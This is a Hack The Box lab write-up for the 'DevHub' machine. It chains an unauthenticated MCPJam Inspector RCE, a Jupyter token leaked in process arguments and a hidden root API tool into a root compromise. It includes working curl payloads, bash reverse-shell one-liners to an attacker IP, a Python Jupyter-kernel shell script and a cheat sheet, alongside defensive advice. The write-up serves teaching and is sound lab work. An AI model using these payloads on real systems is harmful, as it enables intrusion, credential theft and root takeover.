# Hack The Box — DevHub Writeup

> **Difficulty:** Medium  
> **Target:** `10.129.245.216`  
> **Hostname:** `devhub.htb`  
> **Platform:** Linux  
> **Primary themes:** Exposed developer tooling, MCP RCE, Jupyter token leakage, local API abuse, private SSH key disclosure  
>
> **Flag handling:** Flag values are intentionally **redacted** for writeup hygiene. The exact commands used to read them are included.

---

## Contents

1. [Executive Summary](#1-executive-summary)
2. [Attack Path Diagram](#2-attack-path-diagram)
3. [Reconnaissance](#3-reconnaissance)
4. [Web Enumeration](#4-web-enumeration)
5. [Initial Access: MCPJam Inspector RCE](#5-initial-access-mcpjam-inspector-rce)
6. [Shell Stabilization](#6-shell-stabilization)
7. [Pivot from `mcp-dev` to `analyst`](#7-pivot-from-mcp-dev-to-analyst)
8. [Privilege Escalation from `analyst` to `root`](#8-privilege-escalation-from-analyst-to-root)
9. [Full Kill Chain](#9-full-kill-chain)
10. [Key Vulnerabilities](#10-key-vulnerabilities)
11. [Knowledge Gaps and Concepts](#11-knowledge-gaps-and-concepts)
12. [Troubleshooting](#12-troubleshooting)
13. [Defensive Recommendations](#13-defensive-recommendations)
14. [Command Cheat Sheet](#14-command-cheat-sheet)
15. [References](#15-references)

---

## 1. Executive Summary

The machine exposed only SSH and HTTP externally. The HTTP service redirected to `devhub.htb`, where the landing page hinted at an internal developer tool, **MCPJam Inspector**, running on port `6274`.

The installed MCPJam Inspector version was later confirmed as `1.4.2`, which matched a known unauthenticated RCE issue affecting MCPJam Inspector versions `1.4.2` and earlier. The vulnerable endpoint was:

```http
POST /api/mcp/connect
```

By sending a crafted `serverConfig` object with attacker-controlled `command` and `args`, arbitrary commands were executed as the service user `mcp-dev`.

After initial access, local service enumeration revealed:

| Local Port | Service | Running As | Importance |
|---:|---|---|---|
| `127.0.0.1:8888` | JupyterLab | `analyst` | Jupyter token leaked in process arguments |
| `127.0.0.1:5000` | OPSMCP Flask API | `root` | Hardcoded API key and hidden root credential dump tool |

The user pivot was achieved through Jupyter token reuse. Root was achieved by abusing a root-owned local Flask API that exposed a hidden admin tool capable of dumping `/root/.ssh/id_rsa`.

---

## 2. Attack Path Diagram

```mermaid
flowchart TD
    A[Nmap scan] --> B[HTTP redirects to devhub.htb]
    B --> C[Web page reveals MCPJam Inspector on 6274]
    C --> D[Exploit /api/mcp/connect]
    D --> E[Shell as mcp-dev]
    E --> F[Enumerate local ports]
    F --> G[JupyterLab on 127.0.0.1:8888]
    G --> H[Token leaked in ps auxww]
    H --> I[Jupyter API code execution]
    I --> J[Shell as analyst]
    J --> K[Read user.txt]
    J --> L[Inspect /opt/opsmcp/server.py]
    L --> M[Find hardcoded API key]
    M --> N[Call hidden ops._admin_dump]
    N --> O[Dump /root/.ssh/id_rsa]
    O --> P[SSH as root]
    P --> Q[Read root.txt]
```

---

## 3. Reconnaissance

### 3.1 Initial Nmap Scan

```bash
nmap -sC -sV 10.129.245.216
```

Relevant output:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 Ubuntu Linux; protocol 2.0
80/tcp open  http    nginx 1.18.0 Ubuntu
|_http-title: Did not follow redirect to http://devhub.htb/
|_http-server-header: nginx/1.18.0 Ubuntu
```

The important line was:

```text
Did not follow redirect to http://devhub.htb/
```

That means name-based virtual hosting is in use.

### 3.2 Add Host Entry

```bash
sudo nano /etc/hosts
```

Add:

```text
10.129.245.216 devhub.htb
```

Verify:

```bash
ping -c 2 devhub.htb
curl -I http://devhub.htb
```

---

## 4. Web Enumeration

Opening the website showed a dashboard that referenced MCP tooling. The key hint was:

```text
MCP Inspector
Active - Port 6274
```

At this point, the correct direction was application enumeration, not nginx exploitation.

### Why nginx Was Not the Main Target

The server banner showed:

```text
nginx 1.18.0 Ubuntu
```

This should not be treated as automatic proof of vulnerability. Ubuntu often backports security patches while keeping the same displayed upstream version. For CTF and real-world methodology, version banners are only hints. The application behind the server matters more.

Good thinking process:

1. Identify the web application.
2. Check exposed development/debug tools.
3. Confirm exact application version.
4. Validate exploitability with a safe proof.
5. Only chase server CVEs when evidence supports it.

---

## 5. Initial Access: MCPJam Inspector RCE

### 5.1 Access MCPJam

The target exposed MCPJam Inspector on port `6274`:

```bash
curl -i http://devhub.htb:6274/
```

After getting a shell, the installed package confirmed the vulnerable version:

```bash
cat /opt/mcpjam/node_modules/@mcpjam/inspector/package.json | head -40
```

Relevant output:

```json
{
  "name": "@mcpjam/inspector",
  "productName": "MCPJam Inspector",
  "version": "1.4.2"
}
```

### 5.2 Vulnerable Endpoint

The endpoint accepts MCP server configuration:

```http
POST /api/mcp/connect
```

The attacker-controlled fields were:

```json
{
  "serverConfig": {
    "command": "COMMAND_HERE",
    "args": ["ARGUMENTS_HERE"],
    "env": {}
  },
  "serverId": "test"
}
```

The backend attempts to start the provided command as an MCP server. If the endpoint is unauthenticated and does not restrict commands, this becomes remote command execution.

### 5.3 First RCE Test

```bash
curl -s -X POST http://devhub.htb:6274/api/mcp/connect \
-H "Content-Type: application/json" \
-d '{
  "serverConfig": {
    "command": "id",
    "args": [],
    "env": {}
  },
  "serverId": "test"
}'
```

Output:

```json
{
  "success": false,
  "error": "Connection failed for server test: MCP error -32000: Connection closed",
  "details": "MCP error -32000: Connection closed"
}
```

This error was expected. The command `id` is not a long-running MCP server, so it exits immediately. The API reports that the MCP connection closed, but the command may still have executed.

This is a **blind RCE** situation.

### 5.4 Confirm Blind RCE with Callback

Get attacker VPN IP:

```bash
ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
```

Result:

```text
10.10.14.99
```

Start listener:

```bash
nc -lvnp 9001
```

Send callback payload:

```bash
curl -s -X POST http://devhub.htb:6274/api/mcp/connect \
-H "Content-Type: application/json" \
-d '{
  "serverConfig": {
    "command": "/bin/bash",
    "args": ["-lc", "echo CVE_2026_23744_WORKS >/dev/tcp/10.10.14.99/9001"],
    "env": {}
  },
  "serverId": "blindtest1"
}'
```

Listener output:

```text
Ncat: Connection from 10.129.245.216
CVE_2026_23744_WORKS
```

This confirmed remote command execution.

### 5.5 Reverse Shell as `mcp-dev`

Start listener:

```bash
nc -lvnp 4444
```

Create payload:

```bash
cat > payload.json <<'EOF'
{
  "serverConfig": {
    "command": "/bin/bash",
    "args": ["-lc", "bash -i >& /dev/tcp/10.10.14.99/4444 0>&1"],
    "env": {}
  },
  "serverId": "shell1"
}
EOF
```

Send it:

```bash
curl -s -X POST http://devhub.htb:6274/api/mcp/connect \
-H "Content-Type: application/json" \
-d @payload.json
```

Shell received:

```text
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

Verify user:

```bash
id
whoami
pwd
```

Output:

```text
uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
mcp-dev
/opt/mcpjam/node_modules/@mcpjam/inspector
```

---

## 6. Shell Stabilization

Basic stabilization:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 columns 120
```

If the shell supports backgrounding:

```text
CTRL + Z
```

On the attacker machine:

```bash
stty raw -echo; fg
```

Back inside the shell:

```bash
reset
export TERM=xterm
stty rows 40 columns 120
```

Avoid interactive sudo prompts in fragile shells. Use:

```bash
sudo -n -l
```

instead of:

```bash
sudo -l
```

---

## 7. Pivot from `mcp-dev` to `analyst`

### 7.1 Enumerate Users

```bash
ls -la /home
getent passwd 1001
getent passwd 1002
```

Output:

```text
mcp-dev:x:1001:1001::/home/mcp-dev:/bin/bash
analyst:x:1002:1002::/home/analyst:/bin/bash
```

The next likely user was `analyst`.

### 7.2 Enumerate Local Services

```bash
ss -tulpen
```

Important output:

```text
tcp LISTEN 127.0.0.1:8888  cgroup:/system.slice/jupyter.service uid:1002
tcp LISTEN 127.0.0.1:5000  cgroup:/system.slice/opsmcp.service
tcp LISTEN 0.0.0.0:6274    users:("node-MainThread") uid:1001
```

Interpretation:

| Port | Service | User | Meaning |
|---:|---|---|---|
| `6274` | MCPJam | `mcp-dev` | Initial shell source |
| `8888` | JupyterLab | `analyst` | User pivot target |
| `5000` | OPSMCP | `root` | Privilege escalation target |

### 7.3 Jupyter Token Leak

Process listing exposed the Jupyter token:

```bash
ps auxww | egrep "jupyter|8888|opsmcp|5000|mcpjam" | grep -v grep
```

Relevant output:

```text
analyst 1083 ... /home/analyst/jupyter-env/bin/jupyter-lab \
  --ip=127.0.0.1 \
  --port=8888 \
  --no-browser \
  --notebook-dir=/home/analyst/notebooks \
  --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 \
  --ServerApp.password=
```

Token:

```text
a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

Confirm token access:

```bash
TOKEN='a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7'

curl -i "http://127.0.0.1:8888/lab?token=$TOKEN" | head -40
curl -i "http://127.0.0.1:8888/api/kernels?token=$TOKEN"
```

Successful access returned:

```text
HTTP/1.1 200 OK
Server: TornadoServer/6.5.4
```

### 7.4 Execute Code Through Jupyter

Jupyter kernels accept code execution requests through their API and WebSocket channel. A helper script was used to create/connect to a kernel and send an `execute_request` that launched a reverse shell.

Create helper:

```bash
cat > /tmp/jupyter_analyst_shell.py <<'PY'
#!/usr/bin/env python3
import base64, json, os, socket, struct, sys, time, uuid
import urllib.parse, urllib.request

HOST = "127.0.0.1"
PORT = 8888
TOKEN = sys.argv[1]
LHOST = sys.argv[2]
LPORT = sys.argv[3]

code = f"""
import subprocess
subprocess.Popen(['/bin/bash','-lc','bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'])
"""

def post_json(path, body):
    url = f"http://{HOST}:{PORT}{path}"
    data = json.dumps(body).encode()
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("Authorization", f"token {TOKEN}")
    with urllib.request.urlopen(req) as r:
        return json.loads(r.read().decode())

def ws_send(sock, text):
    payload = text.encode()
    first = 0x81
    mask_bit = 0x80
    if len(payload) < 126:
        header = struct.pack("!BB", first, mask_bit | len(payload))
    elif len(payload) < 65536:
        header = struct.pack("!BBH", first, mask_bit | 126, len(payload))
    else:
        header = struct.pack("!BBQ", first, mask_bit | 127, len(payload))
    mask = os.urandom(4)
    masked = bytes(payload[i] ^ mask[i % 4] for i in range(len(payload)))
    sock.sendall(header + mask + masked)

kernel = post_json(f"/api/kernels?token={urllib.parse.quote(TOKEN)}", {})
kernel_id = kernel["id"]
session_id = uuid.uuid4().hex
key = base64.b64encode(os.urandom(16)).decode()
path = f"/api/kernels/{kernel_id}/channels?session_id={session_id}&token={urllib.parse.quote(TOKEN)}"

s = socket.create_connection((HOST, PORT))
handshake = (
    f"GET {path} HTTP/1.1\r\n"
    f"Host: {HOST}:{PORT}\r\n"
    "Upgrade: websocket\r\n"
    "Connection: Upgrade\r\n"
    f"Sec-WebSocket-Key: {key}\r\n"
    "Sec-WebSocket-Version: 13\r\n"
    f"Origin: http://{HOST}:{PORT}\r\n"
    "\r\n"
)
s.sendall(handshake.encode())

resp = s.recv(4096)
if b"101 Switching Protocols" not in resp:
    print(resp.decode(errors="ignore"))
    sys.exit(1)

msg = {
    "header": {
        "msg_id": uuid.uuid4().hex,
        "username": "analyst",
        "session": session_id,
        "date": time.strftime("%Y-%m-%dT%H:%M:%S"),
        "msg_type": "execute_request",
        "version": "5.3"
    },
    "parent_header": {},
    "metadata": {},
    "content": {
        "code": code,
        "silent": False,
        "store_history": True,
        "user_expressions": {},
        "allow_stdin": False,
        "stop_on_error": True
    },
    "channel": "shell",
    "buffers": []
}

ws_send(s, json.dumps(msg))
time.sleep(2)
print("[+] Sent reverse shell payload through Jupyter")
PY
```

Start listener:

```bash
nc -lvnp 5555
```

Trigger shell:

```bash
TOKEN='a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7'
python3 /tmp/jupyter_analyst_shell.py "$TOKEN" 10.10.14.99 5555
```

Shell received:

```text
analyst@devhub:~$
```

Read user flag:

```bash
cat /home/analyst/user.txt
```

Output:

```text
[REDACTED_USER_FLAG]
```

---

## 8. Privilege Escalation from `analyst` to `root`

### 8.1 Identify Root-Owned OPSMCP API

From previous local service enumeration:

```text
127.0.0.1:5000 OPSMCP
```

Check the API:

```bash
curl -i http://127.0.0.1:5000/
```

Output:

```json
{
  "auth": "Required - X-API-Key header",
  "endpoints": ["/tools/list", "/tools/call", "/health"],
  "server": "OPSMCP",
  "status": "operational",
  "version": "2.1.0"
}
```

Process listing showed the server ran as root:

```bash
ps auxww | grep opsmcp | grep -v grep
```

Output:

```text
root 1091 ... /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

### 8.2 Read Source Code

```bash
ls -la /opt/opsmcp
cat /opt/opsmcp/server.py
```

Important finding:

```python
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

The file also defined hidden tools:

```python
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}
```

The dangerous block:

```python
if target == "ssh_keys":
    with open('/root/.ssh/id_rsa', 'r') as f:
        key_data = f.read()
```

Because the service ran as root, this hidden tool could read the root private key.

### 8.3 Validate API Key

```bash
KEY='opsmcp_secret_key_4f5a6b7c8d9e0f1a'

curl -s -H "X-API-Key: $KEY" \
http://127.0.0.1:5000/tools/list | python3 -m json.tool
```

Output:

```json
{
  "count": 4,
  "tools": [
    "ops.system_status",
    "ops.list_services",
    "ops.check_disk",
    "ops.view_logs"
  ]
}
```

Only visible tools were listed, but the source code showed hidden tools were still callable through `/tools/call`.

### 8.4 Dump Root SSH Key

```bash
curl -s -X POST http://127.0.0.1:5000/tools/call \
-H "Content-Type: application/json" \
-H "X-API-Key: $KEY" \
-d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}' \
> /tmp/root_key_dump.json
```

Check response:

```bash
cat /tmp/root_key_dump.json | python3 -m json.tool
```

Expected structure:

```json
{
  "note": "Emergency recovery key dump",
  "root_private_key": "-----BEGIN OPENSSH PRIVATE KEY-----...",
  "target": "ssh_keys"
}
```

### 8.5 Extract Private Key

```bash
python3 - <<'PY'
import json, os

with open('/tmp/root_key_dump.json') as f:
    data = json.load(f)

key = data["root_private_key"]

with open('/tmp/root_id_rsa', "w") as f:
    f.write(key)

os.chmod('/tmp/root_id_rsa', 0o600)

print("[+] Saved root private key to /tmp/root_id_rsa")
print("[+] First line:", key.splitlines()[0])
PY
```

Verify:

```bash
ls -l /tmp/root_id_rsa
head -1 /tmp/root_id_rsa
```

Expected:

```text
-rw------- 1 analyst analyst ... /tmp/root_id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
```

### 8.6 SSH as Root

In a weak reverse shell, host verification can fail because SSH cannot prompt properly. Use these options:

```bash
ssh -o StrictHostKeyChecking=no \
-o UserKnownHostsFile=/dev/null \
-o IdentitiesOnly=yes \
-i /tmp/root_id_rsa \
root@127.0.0.1 'id; hostname; cat /root/root.txt'
```

For an interactive shell:

```bash
ssh -tt \
-o StrictHostKeyChecking=no \
-o UserKnownHostsFile=/dev/null \
-o IdentitiesOnly=yes \
-i /tmp/root_id_rsa \
root@127.0.0.1
```

Root shell:

```text
root@devhub:~#
```

Read root flag:

```bash
cat /root/root.txt
```

Output:

```text
[REDACTED_ROOT_FLAG]
```

---

## 9. Full Kill Chain

| Phase | Command / Action | Result |
|---|---|---|
| Recon | `nmap -sC -sV` | Found SSH and HTTP |
| Vhost setup | `/etc/hosts` | Resolved `devhub.htb` |
| Web enum | Browser/curl | Found MCPJam on `6274` |
| RCE proof | `/api/mcp/connect` callback | Confirmed blind RCE |
| Initial shell | Bash reverse shell | Shell as `mcp-dev` |
| Local enum | `ss -tulpen` | Found Jupyter and OPSMCP |
| Token leak | `ps auxww` | Found Jupyter token |
| User pivot | Jupyter API | Shell as `analyst` |
| User flag | `cat /home/analyst/user.txt` | User flag obtained |
| Root enum | Read `/opt/opsmcp/server.py` | Found API key and hidden tool |
| Root exploit | `ops._admin_dump` | Dumped root SSH key |
| Root shell | `ssh -i /tmp/root_id_rsa root@127.0.0.1` | Root obtained |
| Root flag | `cat /root/root.txt` | Root flag obtained |

---

## 10. Key Vulnerabilities

### 10.1 Exposed Development Tool

MCPJam Inspector was reachable externally:

```text
0.0.0.0:6274
```

Developer tools should normally be private, authenticated, or bound to localhost.

### 10.2 Unauthenticated MCPJam RCE

The `/api/mcp/connect` endpoint accepted attacker-controlled commands. Impact:

```text
Remote unauthenticated attacker -> command execution as mcp-dev
```

### 10.3 Jupyter Token in Process Arguments

The token was visible through `ps auxww`:

```text
--ServerApp.token=<token>
```

This allowed `mcp-dev` to authenticate to Jupyter and execute code as `analyst`.

### 10.4 Hardcoded Root API Key

The root-owned Flask service contained:

```python
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

Hardcoded secrets in readable source files are a common privilege escalation risk.

### 10.5 Hidden Tool Still Callable

The dangerous tool was hidden from `/tools/list`, but callable through `/tools/call`.

Bad security pattern:

```text
Security by obscurity
```

The hidden tool read:

```text
/root/.ssh/id_rsa
```

---

## 11. Knowledge Gaps and Concepts

### 11.1 Version Banners and Backporting

Do not exploit based only on banners like:

```text
nginx 1.18.0
```

Linux distributions frequently backport security fixes without changing the visible upstream version. Always validate application-specific attack surface first.

### 11.2 Blind RCE

Blind RCE means the command executes, but output is not returned in the HTTP response.

Useful confirmation methods:

```bash
echo test >/dev/tcp/ATTACKER_IP/PORT
curl http://ATTACKER_IP:PORT/proof
ping -c 1 ATTACKER_IP
```

### 11.3 Local Service Enumeration

External scans may miss local-only services. After getting a shell, run:

```bash
ss -tulpen
ps auxww
```

These often reveal the privilege escalation path.

### 11.4 Jupyter as a Code Execution Surface

Jupyter is meant to execute code. If you obtain its token, you usually obtain code execution as the Jupyter user.

Important endpoints:

```text
/api/kernels
/api/kernels/<kernel-id>/channels
```

### 11.5 Process Argument Secret Leakage

Secrets passed as command-line arguments can leak through process listings.

Avoid:

```text
--token=secret
--password=secret
--api-key=secret
```

Prefer:

- Restricted config files
- Secret managers
- Systemd credentials
- Environment files with strict permissions

### 11.6 Hidden API Functions

A hidden function is not secure if it remains callable. Every dangerous function needs authorization checks, not just omission from a listing endpoint.

### 11.7 SSH Key Rules

Private keys must be protected:

```bash
chmod 600 keyfile
```

Useful SSH options during CTF shells:

```bash
-o StrictHostKeyChecking=no
-o UserKnownHostsFile=/dev/null
-o IdentitiesOnly=yes
-tt
```

---

## 12. Troubleshooting

### `/api/mcp/connect` returns `Connection closed`

This can still mean RCE works. The command exits because it is not a real MCP server. Confirm with a network callback.

### Reverse shell connects but has no prompt

Type:

```bash
id
whoami
pwd
```

Do not type `cat` randomly, because it waits for input and makes the shell look frozen.

### `sudo -l` breaks the shell

Use:

```bash
sudo -n -l
```

### Jupyter helper returns `403 Forbidden`

Usually the token variable is empty or wrong.

Check:

```bash
echo "$TOKEN"
curl -i "http://127.0.0.1:8888/lab?token=$TOKEN" | head
```

### SSH says host verification failed

Use:

```bash
ssh -o StrictHostKeyChecking=no \
-o UserKnownHostsFile=/dev/null \
-i /tmp/root_id_rsa \
root@127.0.0.1
```

---

## 13. Defensive Recommendations

### MCPJam Inspector

- Upgrade MCPJam Inspector to a patched version.
- Bind development tools to `127.0.0.1`.
- Require authentication on management endpoints.
- Do not allow arbitrary command configuration from unauthenticated clients.

### JupyterLab

- Do not pass tokens in process arguments.
- Use restricted configuration files or secret managers.
- Bind local development services to localhost.
- Run Jupyter under a low-privileged user.
- Protect `/proc` visibility where possible.

### OPSMCP API

- Do not run internal APIs as root unless unavoidable.
- Remove hardcoded API keys.
- Do not include credential dumping functionality.
- Enforce authorization per tool, not only API-level authentication.
- Remove hidden-but-callable admin functions.

### System Hardening

- Consider `hidepid=2` for `/proc`.
- Restrict source/config readability.
- Rotate exposed SSH keys and API keys.
- Monitor local-only services.
- Apply least privilege to internal automation services.

---

## 14. Command Cheat Sheet

### Add Host

```bash
echo '10.129.245.216 devhub.htb' | sudo tee -a /etc/hosts
```

### Scan

```bash
nmap -sC -sV 10.129.245.216
```

### Confirm MCPJam RCE

```bash
nc -lvnp 9001
```

```bash
curl -s -X POST http://devhub.htb:6274/api/mcp/connect \
-H "Content-Type: application/json" \
-d '{
  "serverConfig": {
    "command": "/bin/bash",
    "args": ["-lc", "echo RCE_OK >/dev/tcp/10.10.14.99/9001"],
    "env": {}
  },
  "serverId": "test"
}'
```

### Reverse Shell as `mcp-dev`

```bash
nc -lvnp 4444
```

```bash
curl -s -X POST http://devhub.htb:6274/api/mcp/connect \
-H "Content-Type: application/json" \
-d '{
  "serverConfig": {
    "command": "/bin/bash",
    "args": ["-lc", "bash -i >& /dev/tcp/10.10.14.99/4444 0>&1"],
    "env": {}
  },
  "serverId": "shell1"
}'
```

### Enumerate Local Services

```bash
ss -tulpen
ps auxww | egrep "jupyter|8888|opsmcp|5000|mcpjam" | grep -v grep
```

### Test Jupyter Token

```bash
TOKEN='a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7'
curl -i "http://127.0.0.1:8888/lab?token=$TOKEN" | head
curl -i "http://127.0.0.1:8888/api/kernels?token=$TOKEN"
```

### OPSMCP List Tools

```bash
KEY='opsmcp_secret_key_4f5a6b7c8d9e0f1a'
curl -s -H "X-API-Key: $KEY" http://127.0.0.1:5000/tools/list | python3 -m json.tool
```

### Dump Root SSH Key

```bash
curl -s -X POST http://127.0.0.1:5000/tools/call \
-H "Content-Type: application/json" \
-H "X-API-Key: $KEY" \
-d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}' \
> /tmp/root_key_dump.json
```

### Extract Root Key

```bash
python3 - <<'PY'
import json, os
with open('/tmp/root_key_dump.json') as f:
    data = json.load(f)
key = data['root_private_key']
open('/tmp/root_id_rsa', 'w').write(key)
os.chmod('/tmp/root_id_rsa', 0o600)
PY
```

### SSH as Root

```bash
ssh -tt \
-o StrictHostKeyChecking=no \
-o UserKnownHostsFile=/dev/null \
-o IdentitiesOnly=yes \
-i /tmp/root_id_rsa \
root@127.0.0.1
```

---

## 15. References

- [NVD: CVE-2026-23744](https://nvd.nist.gov/vuln/detail/CVE-2026-23744)
- [GitHub Advisory: GHSA-232v-j27c-5pp6](https://github.com/advisories/GHSA-232v-j27c-5pp6)
- [MCPJam Inspector Security Advisory](https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6)
- [Jupyter Server REST API Documentation](https://jupyter-server.readthedocs.io/en/latest/developers/rest-api.html)
- [OpenSSH Manual](https://man.openbsd.org/ssh)

---

## Final Notes

This machine is a strong example of a modern internal-tool chain:

```text
Exposed developer tool -> RCE -> local service discovery -> token leakage -> user pivot -> root API abuse -> private key dump
```

The main lesson is simple: the externally exposed service was only the start. The real compromise came from carefully reading local processes, local ports, and source code.

